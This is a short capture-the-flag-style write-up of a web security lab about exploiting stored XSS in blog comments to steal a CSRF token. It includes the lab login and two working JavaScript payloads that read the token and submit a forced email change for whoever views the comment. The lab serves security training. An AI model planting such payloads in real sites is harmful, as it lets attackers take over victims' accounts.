Title: Exploiting XSS to bypass CSRF defenses
Level: PRACTITIONER
Desc:  This lab contains a stored XSS vulnerability in the blog comments function. To solve the lab, exploit the vulnerability to steal a CSRF token, which you can then use to change the email address of someone who views the blog post comments.
You can log in to your own account using the following credentials: wiener:peter 
Hint: You cannot register an email address that is already taken by another user. If you change your own email address while testing your exploit, use a different email address for the final exploit you deliver to the victim. 

# Walkthrough:

This one worked for me.
```
<script>
function hax(){
  var token = document.getElementsByName('csrf')[0].value;
  var cookie = document.cookie;
  var data = new FormData();
  data.append('csrf', token);
  data.append('email', 'teset@test.sss');

  fetch('/my-account/change-email', {
  method: 'POST',
  mode: 'no-cors',
  body: data
});
}
window.onload =  hax;
</script>
```

Script from the solution:
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
